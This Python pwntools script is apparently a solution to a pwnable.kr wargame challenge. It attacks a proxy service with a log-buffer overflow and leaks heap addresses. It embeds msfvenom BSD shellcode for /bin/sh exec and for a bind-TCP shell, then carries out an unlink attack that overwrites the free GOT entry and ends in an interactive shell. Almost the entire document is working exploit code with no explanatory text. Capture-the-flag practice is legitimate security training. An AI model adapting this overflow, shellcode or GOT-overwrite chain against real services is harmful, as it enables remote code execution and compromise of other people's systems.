from pwn import *
import time

DEBUG = 1

if DEBUG:
    context.log_level = 'debug'
    host, port = ('192.168.147.130', 8756)
else:
    context.log_level = 'info'
    host, port = ('pwnable.kr', 9903)


def send_request(request_host, request_port=80):
    sh = remote(host, port)
    sh.send('GET ' + '://' + request_host + ':' + str(request_port))
    time.sleep(0.2)
    sh.close()


def get_log():
    sh = remote(host, port)
    sh.send('admincmd_proxy_dump_log' + '\r\n')
    data = ''
    while True:
        try:
            data += sh.recv(1024)
        except EOFError:
            break
    return data


def leak():
    send_request('A' * 116 + 'leak')
    data = get_log()
    prev = u32(data.split('leak')[1][:4])
    return prev


# Fill log
for n in range(32):
    send_request('%d-leo00000.coding.me' % n)

# Send shellcode
# msfvenom -p bsd/x86/exec CMD='/bin/sh' -f python -b '\x00\x0a\x0d :/'
shellcode = ""
shellcode += "\xd9\xc4\xd9\x74\x24\xf4\xba\x07\x97\x37\x03\x5e\x29"
shellcode += "\xc9\xb1\x07\x83\xee\xfc\x31\x56\x13\x03\x51\x84\xd5"
shellcode += "\xf6\x6c\x6a\xf1\xf1\x8e\x6a\x02\x2d\xec\x03\x6c\x1e"
shellcode += "\x83\xbb\x70\x3b\x33\x6c\x22\x0b\x88\xdc\x09\xeb"
# msfvenom -p bsd/x86/shell/bind_tcp -b ':/\x00\x0a\x0d' -f python
shellcode =  ""
shellcode += "\xd9\xc2\xd9\x74\x24\xf4\x58\xbe\x99\x92\x27\xe0\x31"
shellcode += "\xc9\xb1\x0e\x31\x70\x19\x03\x70\x19\x83\xc0\x04\x7b"
shellcode += "\x67\x4d\x81\x23\x11\xc0\x29\xc3\x23\xf4\xf5\x6a\xc2"
shellcode += "\xa4\x47\x3e\x47\x1b\x22\xae\x8a\x1b\x2b\x5d\x45\x4f"
shellcode += "\x1e\x0b\x0e\x37\x53\x4b\x7e\xad\xa6\xcb\x2d\x61\x8f"
shellcode += "\xdb\x83\x35\xf1\x16\xa3\x67\x5e\xf9\x33\xed\x5d\xa1"
shellcode += "\xf6\x72\xa2"
send_request(shellcode)
shell_addr = leak() + 8
log.info('leak shellcode addr:' + hex(shell_addr))

# Unlink exploit
"""
Log:
    IP   :   4 bytes (+ 0)
    Port :   4 bytes (+ 4)
    Host : 120 bytes (+ 8)
    Prev :   4 bytes (+ 128)
    Next :   4 bytes (+ 132)
"""
free_got = 0x804a16c
fake_prev = p32(shell_addr)
fake_next = p32(free_got - 128)
payload = 'A' * 112 + fake_prev + fake_next
send_request(payload)

tail_addr = leak()
log.info('leak tail addr:' + hex(tail_addr))

payload2 = 'A' * 120 + p32(tail_addr - 8) + p32(tail_addr - 8)
send_request(payload2)

# Trigger
sh = remote(host, port)
sh.send('GET ' + '://leo00000.coding.me' + ':' + str(80))
sh.interactive()
